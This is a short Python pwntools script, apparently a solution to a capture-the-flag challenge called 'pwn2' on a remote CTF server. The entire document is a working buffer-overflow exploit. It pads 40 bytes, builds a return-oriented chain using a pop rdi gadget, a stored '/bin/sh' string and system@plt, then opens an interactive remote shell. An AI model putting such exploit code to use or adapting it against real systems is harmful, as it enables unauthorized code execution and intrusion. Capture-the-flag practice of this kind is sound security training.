from pwn import *

exe = ELF('./pwn2')

offset = b'i'*40
pop_rdi = 0x0000000000401196
inp = 0x404090
ret = 0x000000000040101a

io = remote('challs.n00bzunit3d.xyz', 61223)
io.recvuntil(b'flag?\n')
io.sendline(b'/bin/sh')
io.recvuntil(b'flag?\n')
io.sendline(offset + p64(pop_rdi) + p64(inp) + p64(ret) + p64(exe.plt['system']))
io.interactive()